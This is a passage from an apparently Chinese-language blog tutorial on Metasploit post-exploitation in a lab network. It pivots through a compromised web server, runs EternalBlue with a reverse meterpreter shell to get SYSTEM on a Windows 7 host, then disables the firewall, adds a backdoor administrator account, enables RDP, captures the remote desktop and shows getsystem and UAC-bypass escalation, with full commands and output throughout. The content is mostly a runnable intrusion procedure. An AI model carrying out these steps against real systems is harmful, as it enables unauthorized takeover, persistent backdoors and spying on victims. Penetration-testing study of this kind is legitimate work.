msf5 auxiliary<span class="token punctuation">(</span>scanner/portscan/tcp<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> THREADS 50
THREADS <span class="token operator">=</span><span class="token operator">></span> 50
msf5 auxiliary<span class="token punctuation">(</span>scanner/portscan/tcp<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> TIMEOUT 500
TIMEOUT <span class="token operator">=</span><span class="token operator">></span> 500
msf5 auxiliary<span class="token punctuation">(</span>scanner/portscan/tcp<span class="token punctuation">)</span> <span class="token operator">></span> run

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.168.9.101:        - 192.168.9.101:139 - TCP OPEN
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.168.9.101:        - 192.168.9.101:135 - TCP OPEN
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.168.9.101:        - 192.168.9.101:445 - TCP OPEN
^C<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.168.9.101:        - Caught interrupt from the console<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module execution completed
msf5 auxiliary<span class="token punctuation">(</span>scanner/portscan/tcp<span class="token punctuation">)</span> <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="端口转发-远程登录"><a href="#端口转发-远程登录" class="headerlink" title="端口转发+远程登录"></a>端口转发+远程登录</h3><ul>
<li>portfwd端口转发</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">portfwd add -L 192.33.6.150 -l 4445 -p 3389 -r 192.168.9.101<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>PS：<code>-L表示外网主机IP、-r表示内网主机IP、-p、-l表示将内网3389端口转发到外网主机的7777端口</code></p>
<ul>
<li>实战：端口转发连接目标主机3389服务远程控制桌面</li>
</ul>
<p>配置端口转发：使用meterpreter中端口映射工具portfwd将内网主机3389端口映射出去，使得外网主机可以远程控制内网主机（注意：该配置是在www服务器的meterpreter会话中配置的，而不是内网普通用户主机）</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> portfwd add -L 192.33.6.150 -l 4445 -p 3389 -r 192.168.9.101
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Local TCP relay created: 192.33.6.150:4445 <span class="token operator">&lt;</span>-<span class="token operator">></span> 192.168.9.101:3389
meterpreter <span class="token operator">></span> portfwd list

Active Port Forwards
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

   Index  Local              Remote              Direction
   -----  -----              ------              ---------
   1      192.33.6.150:4445  192.168.9.101:3389  Forward

1 total active port forwards.

meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里以www服务主机为跳板拿下内网主机权限（关于内网主机信息收集部分【主机发现、端口服务等】见上面，这里内网主机是一台win7，直接攻击利用），使用相应ms17-010攻击模块进行内网主机<code>192.168.9.101</code>的攻击（攻击内网前提：添加网路由转发【具体操作见上面部分】）</p>
<pre class="line-numbers language-bash"><code class="language-bash">msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> rhosts 192.168.9.101
rhosts <span class="token operator">=</span><span class="token operator">></span> 192.168.9.101
msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">></span>set payload windows/x64/meterpreter/reverse_tcp
payload <span class="token operator">=</span><span class="token operator">></span> windows/x64/meterpreter/reverse_tcp
msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">></span>
msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">></span> exploit 

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on 192.33.6.150:8443 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.168.9.101:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.168.9.101:445     - Host is likely VULNERABLE to MS17-010<span class="token operator">!</span> - Windows 7 Enterprise 7601 Service Pack 1 x64 <span class="token punctuation">(</span>64-bit<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.168.9.101:445     - Scanned 1 of 1 hosts <span class="token punctuation">(</span>100% complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.168.9.101:445 - Connecting to target <span class="token keyword">for</span> exploitation.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.168.9.101:445 - Connection established <span class="token keyword">for</span> exploitation.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.168.9.101:445 - Target OS selected valid <span class="token keyword">for</span> OS indicated by SMB reply
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.168.9.101:445 - CORE raw buffer dump <span class="token punctuation">(</span>40 bytes<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.168.9.101:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 45 6e 74 65 72 70  Windows 7 Enterp
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.168.9.101:445 - 0x00000010  72 69 73 65 20 37 36 30 31 20 53 65 72 76 69 63  rise 7601 Servic
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.168.9.101:445 - 0x00000020  65 20 50 61 63 6b 20 31                          e Pack 1        
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.168.9.101:445 - Target arch selected valid <span class="token keyword">for</span> arch indicated by DCE/RPC reply
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.168.9.101:445 - Trying exploit with 12 Groom Allocations.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.168.9.101:445 - Sending all but last fragment of exploit packet
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.168.9.101:445 - Starting non-paged pool grooming
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.168.9.101:445 - Sending SMBv2 buffers
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.168.9.101:445 - Closing SMBv1 connection creating <span class="token function">free</span> hole adjacent to SMBv2 buffer.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.168.9.101:445 - Sending final SMBv2 buffers.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.168.9.101:445 - Sending last fragment of exploit packet<span class="token operator">!</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.168.9.101:445 - Receiving response from exploit packet
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.168.9.101:445 - ETERNALBLUE overwrite completed successfully <span class="token punctuation">(</span>0xC000000D<span class="token punctuation">)</span><span class="token operator">!</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.168.9.101:445 - Sending egg to corrupted connection.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.168.9.101:445 - Triggering <span class="token function">free</span> of corrupted buffer.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span>201283 bytes<span class="token punctuation">)</span> to 192.33.6.200
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session 3 opened <span class="token punctuation">(</span>192.33.6.150:8443 -<span class="token operator">></span> 192.33.6.200:63021<span class="token punctuation">)</span> at 2020-06-21 15:01:11 -0400
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.168.9.101:445 - <span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.168.9.101:445 - <span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-WIN-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.168.9.101:445 - <span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>

meterpreter <span class="token operator">></span>
meterpreter <span class="token operator">></span> getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter <span class="token operator">></span> ipconfig

Interface  1
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
Name         <span class="token keyword">:</span> Software Loopback Interface 1
Hardware MAC <span class="token keyword">:</span> 00:00:00:00:00:00
MTU          <span class="token keyword">:</span> 4294967295
IPv4 Address <span class="token keyword">:</span> 127.0.0.1
IPv4 Netmask <span class="token keyword">:</span> 255.0.0.0
IPv6 Address <span class="token keyword">:</span> ::1
IPv6 Netmask <span class="token keyword">:</span> ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 11
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
Name         <span class="token keyword">:</span> Intel<span class="token punctuation">(</span>R<span class="token punctuation">)</span> PRO/1000 MT Network Connection
Hardware MAC <span class="token keyword">:</span> 00:0c:29:fb:6f:2e
MTU          <span class="token keyword">:</span> 1500
IPv4 Address <span class="token keyword">:</span> 192.168.9.101
IPv4 Netmask <span class="token keyword">:</span> 255.255.255.0
meterpreter <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>会话信息</p>
<pre class="line-numbers language-bash"><code class="language-bash">msf5 <span class="token operator">></span> sessions 

Active sessions
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  1         meterpreter x86/windows  NT AUTHORITY\NETWORK SERVICE @ SERVER  192.33.6.150:3333 -<span class="token operator">></span> 192.33.6.200:62901 <span class="token punctuation">(</span>192.168.9.50<span class="token punctuation">)</span>
  3         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN-5DTIE0M734E  192.33.6.150:8443 -<span class="token operator">></span> 192.33.6.200:63021 <span class="token punctuation">(</span>192.168.9.101<span class="token punctuation">)</span>

msf5 <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>操作内网主机<code>192.168.9.101</code>，关闭内网主机防火墙、添加管理员、开启3389</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> shell
Process 1188 created.
Channel 3 created.
Microsoft Windows <span class="token punctuation">[</span>�汾 6.1.7601<span class="token punctuation">]</span>
��Ȩ���� <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2009 Microsoft Corporation����������Ȩ����

C:\Windows\system32<span class="token operator">></span>netsh advfirewall <span class="token keyword">set</span> allprofiles state off 
netsh advfirewall <span class="token keyword">set</span> allprofiles state off
ȷ����
C:\Windows\system32<span class="token operator">></span>
C:\Windows\system32<span class="token operator">></span>net user qftm0 123 /add
net user qftm0 123 /add
�����ɹ����ɡ�
C:\Windows\system32<span class="token operator">></span>net localgroup administrators qftm0 /add
net localgroup administrators qftm0 /add
�����ɹ����ɡ�
C:\Windows\system32<span class="token operator">></span>
C:\Windows\system32<span class="token operator">></span>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="token string">" "</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="token string">" "</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
�����ɹ����ɡ�

C:\Windows\system32<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>远程登录</p>
<pre class="line-numbers language-bash"><code class="language-bash"> → Qftm :~/Desktop<span class="token comment" spellcheck="true"># rdesktop 192.33.6.150:4445</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2020/06/20/metasploit-framework/image-20200625185722502.png" alt="image-20200625185722502"></p>
<h3 id="远程监控-桌面截图"><a href="#远程监控-桌面截图" class="headerlink" title="远程监控+桌面截图"></a>远程监控+桌面截图</h3><ul>
<li>相关指令</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">enumdesktops  <span class="token comment" spellcheck="true">#查看可用的桌面</span>
getdesktop    <span class="token comment" spellcheck="true">#获取当前meterpreter 关联的桌面</span>
setdesktop    <span class="token comment" spellcheck="true">#设置meterpreter关联的桌面  -h查看帮助</span>
screenshot    <span class="token comment" spellcheck="true">#截屏</span>
run vnc       <span class="token comment" spellcheck="true">#使用vnc远程桌面连接</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>实战：远程桌面截图+桌面监控</li>
</ul>
<p>远程桌面截图</p>
<p><img src="/2020/06/20/metasploit-framework/image-20200701145642582.png" alt="image-20200701145642582"></p>
<p>远程桌面监控</p>
<p><img src="/2020/06/20/metasploit-framework/image-20200701144911046.png" alt="image-20200701144911046"></p>
<h3 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h3><ul>
<li>getgui命令</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#getgui命令</span>
<span class="token comment" spellcheck="true">#这里需要注意的是通过getgui命令，虽然可以成功添加用户，但是没有权限远程登录桌面，这里推荐使用enable_rdp脚本添加。</span>
run getgui -h  <span class="token comment" spellcheck="true"># 查看帮助</span>
run getgui -e  <span class="token comment" spellcheck="true"># 开启远程桌面RDP</span>
run getgui -u qftm -p 123  <span class="token comment" spellcheck="true"># 添加用户</span>
run getgui -f 6666 -e  <span class="token comment" spellcheck="true"># 3389端口转发到6666</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>enable_rdp脚本</li>
</ul>
<p>脚本相关</p>
<pre class="line-numbers language-bash"><code class="language-bash">msf5 auxiliary<span class="token punctuation">(</span>server/socks5<span class="token punctuation">)</span> <span class="token operator">></span> search enable_rdp

Matching Modules
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

   <span class="token comment" spellcheck="true">#  Name                            Disclosure Date  Rank    Check  Description</span>
   -  ----                            ---------------  ----    -----  -----------
   0  post/windows/manage/enable_rdp                   normal  No     Windows Manage Enable Remote Desktop

msf5 auxiliary<span class="token punctuation">(</span>server/socks5<span class="token punctuation">)</span> <span class="token operator">></span> 

<span class="token comment" spellcheck="true">#vim /usr/share/metasploit-framework/modules/post/windows/manage/enable_rdp.rb</span>

<span class="token comment" spellcheck="true">#由enable_rdp.rb脚本可知：开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>脚本操作</p>
<pre class="line-numbers language-bash"><code class="language-bash">run post/windows/manage/enable_rdp  <span class="token comment" spellcheck="true">#开启远程桌面RDP</span>
run post/windows/manage/enable_rdp USERNAME<span class="token operator">=</span>qftm PASSWORD<span class="token operator">=</span>123 <span class="token comment" spellcheck="true"># 添加用户</span>
run post/windows/manage/enable_rdp FORWARD<span class="token operator">=</span>true LPORT<span class="token operator">=</span>6667  <span class="token comment" spellcheck="true"># 将3389端口转发到6667</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="系统提权"><a href="#系统提权" class="headerlink" title="系统提权"></a>系统提权</h3><p>在获取一个基础的session上进行系统提权：从普通用户或管理员提升到系统最高权限SYSTEM。</p>
<ul>
<li>getsystem提权</li>
</ul>
<p>getsystem是由Metasploit-Framework提供的一个模块，它可以将一个管理帐户（通常为本地Administrator账户）提升为本地SYSTEM帐户。 </p>
<p>工作原理：参考链接【<a href="https://blog.xpnsec.com/becoming-system/" target="_blank" rel="noopener">原文</a>、<a href="https://www.anquanke.com/post/id/87292" target="_blank" rel="noopener">译文</a>】</p>
<pre class="line-numbers language-bash"><code class="language-bash">1<span class="token punctuation">)</span>getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。
2<span class="token punctuation">)</span>getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。
3<span class="token punctuation">)</span>Windows服务已启动，导致与命名管道建立连接。
4<span class="token punctuation">)</span>该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。
5<span class="token punctuation">)</span>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>提权演示操作如下：对内网主机Win7进行不同级别用户的提权</p>
<p>普通用户：root–&gt;fail</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> getuid 
Server username: WIN-5DTIE0M734E\root
meterpreter <span class="token operator">></span> getsystem 
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Named Pipe Impersonation <span class="token punctuation">(</span>In Memory/Admin<span class="token punctuation">)</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Named Pipe Impersonation <span class="token punctuation">(</span>Dropper/Admin<span class="token punctuation">)</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Token Duplication <span class="token punctuation">(</span>In Memory/Admin<span class="token punctuation">)</span>
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>管理员：Administrator–&gt;success</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> getuid 
Server username: WIN-5DTIE0M734E\Administrator
meterpreter <span class="token operator">></span> getsystem 
<span class="token punctuation">..</span>.got system via technique 1 <span class="token punctuation">(</span>Named Pipe Impersonation <span class="token punctuation">(</span>In Memory/Admin<span class="token punctuation">))</span>.
meterpreter <span class="token operator">></span> getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>bypassuac</li>
</ul>
<p>（1）UAC简介</p>
<p>什么是用户帐户控制？</p>
<pre class="line-numbers language-bash"><code class="language-bash">UAC是在Windows Vista及更高版本操作系统中采用的一种控制机制，它以预见的方式阻止不必要的系统范围更改。

换句话说，它是Windows的一项安全功能，支持你阻止任何对系统未经授权的更改操作行为。UAC确保仅在管理员授权的情况下进行某些更改。如果管理员不允许更改，则不会执行这些更改，并且Windows也不会发生任何的改变。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>UAC是如何运作的？</p>
<p>一旦程序执行涉及系统更改/特定任务就会触发UAC。除非尝试执行它们的进程以管理员权限运行，否则这些操作都将被阻止。没有管理员权限将无法执行以下操作：</p>
<blockquote>
<p>注册表修改（如果注册表项位于如HKEY_LOCAL_MACHINE下（因为它影响多个用户），它将是只读的）</p>
<p>加载设备驱动程序</p>
<p>DLL注入</p>
<p>修改系统时间（clock）</p>
<p>修改用户帐户控制设置（通过注册表可以启用/禁用它，但你需要正确的权限才能执行该操作）</p>
<p>修改受保护的目录（例如Windows文件夹，Program Files）</p>
<p>计划任务（例如，以管理员权限自启动）</p>
</blockquote>
<p><strong>注：</strong><a href="https://malwaretips.com/threads/why-uac-is-important-and-how-it-can-protect-you.47157/" target="_blank" rel="noopener">UAC</a>的作用并不是帮你阻止恶意软件或识别程序是否为恶意程序，这主要取决于用户。如果用户以管理员权限执行程序，UAC将提醒用户并要求用户提供确认。</p>
<p>（2）绕过UAC提权</p>
<p>针对上面<code>getsystem</code>提权方式对于普通用户来说是失败的不可正常执行的，那么这种情况下就需要绕过系统UAC来进行<code>getsystem</code>提权。</p>
<p>Metasploit中内置多个<code>bypassuac</code>脚本，原理有所不同，但使用方法类似，运行后返回一个新的会话，再次执行<code>getsystem</code>指令获取系统权限，相关<code>bypassuac</code>脚本如下：</p>
<pre class="line-numbers language-bash"><code class="language-bash">use exploit/windows/local/bypassuac  <span class="token comment" spellcheck="true">#进程注入</span>
use exploit/windows/local/bypassuac_comhijack   <span class="token comment" spellcheck="true">#COM处理程序劫持</span>
use exploit/windows/local/bypassuac_dotnet_profiler
use exploit/windows/local/bypassuac_eventvwr    <span class="token comment" spellcheck="true">#通过Eventvwr注册表项</span>
use exploit/windows/local/bypassuac_fodhelper   <span class="token comment" spellcheck="true">#通过FodHelper注册表项</span>
use exploit/windows/local/bypassuac_injection   <span class="token comment" spellcheck="true">#内存注入</span>
use exploit/windows/local/bypassuac_injection_winsxs
use exploit/windows/local/bypassuac_sdclt
use exploit/windows/local/bypassuac_silentcleanup
use exploit/windows/local/bypassuac_sluihijack
use exploit/windows/local/bypassuac_vbs
use exploit/windows/local/bypassuac_windows_store_filesys
use exploit/windows/local/bypassuac_windows_store_reg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>部分详细介绍操作可参考：<a href="https://www.hackingarticles.in/multiple-ways-to-bypass-uac-using-metasploit/" target="_blank" rel="noopener">Multiple Ways to Bypass UAC using Metasploit</a></p>
<p>这里使用脚本<code>exploit/windows/local/bypassuac</code>进行实战演示，具体操作如下：</p>
<p><code>查看基础会话-&gt;使用脚本-&gt;查看选项-&gt;配置选项(session|payload|target)-&gt;查看选项-&gt;exploit-&gt;getsystem</code></p>
<pre class="line-numbers language-bash"><code class="language-bash">msf5 <span class="token operator">></span> sessions 

Active sessions
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

  Id  Name  Type                     Information                             Connection
  --  ----  ----                     -----------                             ----------
  5         meterpreter x86/windows  WIN-5DTIE0M734E\root @ WIN-5DTIE0M734E  192.33.6.150:3333 -<span class="token operator">></span> 192.33.6.200:62010 <span class="token punctuation">(</span>192.168.9.101<span class="token punctuation">)</span>

msf5 <span class="token operator">></span> 
msf5 <span class="token operator">></span> use exploit/windows/local/bypassuac
msf5 exploit<span class="token punctuation">(</span>windows/local/bypassuac<span class="token punctuation">)</span> <span class="token operator">></span> show options 

Module options <span class="token punctuation">(</span>exploit/windows/local/bypassuac<span class="token punctuation">)</span>:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   SESSION                     <span class="token function">yes</span>       The session to run this module on.
   TECHNIQUE  EXE              <span class="token function">yes</span>       Technique to use <span class="token keyword">if</span> UAC is turned off <span class="token punctuation">(</span>Accepted: PSH, EXE<span class="token punctuation">)</span>

Payload options <span class="token punctuation">(</span>windows/meterpreter/reverse_https<span class="token punctuation">)</span>:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          <span class="token function">yes</span>       Exit technique <span class="token punctuation">(</span>Accepted: <span class="token string">''</span>, seh, thread, process, none<span class="token punctuation">)</span>
   LHOST     192.33.6.150     <span class="token function">yes</span>       The local listener <span class="token function">hostname</span>
   LPORT     8443             <span class="token function">yes</span>       The local listener port
   LURI                       no        The HTTP Path

Exploit target:

   Id  Name
   --  ----
   0   Windows x86

msf5 exploit<span class="token punctuation">(</span>windows/local/bypassuac<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> session 5
session <span class="token operator">=</span><span class="token operator">></span> 5
msf5 exploit<span class="token punctuation">(</span>windows/local/bypassuac<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> payload windows/meterpreter/reverse_tcp
payload <span class="token operator">=</span><span class="token operator">></span> windows/meterpreter/reverse_tcp
msf5 exploit<span class="token punctuation">(</span>windows/local/bypassuac<span class="token punctuation">)</span> <span class="token operator">></span> show targets 

Exploit targets:

   Id  Name
   --  ----
   0   Windows x86
   1   Windows x64

msf5 exploit<span class="token punctuation">(</span>windows/local/bypassuac<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> target 1
target <span class="token operator">=</span><span class="token operator">></span> 1
msf5 exploit<span class="token punctuation">(</span>windows/local/bypassuac<span class="token punctuation">)</span> <span class="token operator">></span> 
msf5 exploit<span class="token punctuation">(</span>windows/local/bypassuac<span class="token punctuation">)</span> <span class="token operator">></span> show options 

Module options <span class="token punctuation">(</span>exploit/windows/local/bypassuac<span class="token punctuation">)</span>:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   SESSION    5                <span class="token function">yes</span>       The session to run this module on.
   TECHNIQUE  EXE              <span class="token function">yes</span>       Technique to use <span class="token keyword">if</span> UAC is turned off <span class="token punctuation">(</span>Accepted: PSH, EXE<span class="token punctuation">)</span>


Payload options <span class="token punctuation">(</span>windows/meterpreter/reverse_tcp<span class="token punctuation">)</span>:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          <span class="token function">yes</span>       Exit technique <span class="token punctuation">(</span>Accepted: <span class="token string">''</span>, seh, thread, process, none<span class="token punctuation">)</span>
   LHOST     192.33.6.150     <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>
   LPORT     8443             <span class="token function">yes</span>       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Windows x64


msf5 exploit<span class="token punctuation">(</span>windows/local/bypassuac<span class="token punctuation">)</span> <span class="token operator">></span> exploit 

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on 192.33.6.150:8443 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> UAC is Enabled, checking level<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> UAC is <span class="token keyword">set</span> to Default
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> BypassUAC can bypass this setting, continuing<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Part of Administrators group<span class="token operator">!</span> Continuing<span class="token punctuation">..</span>.
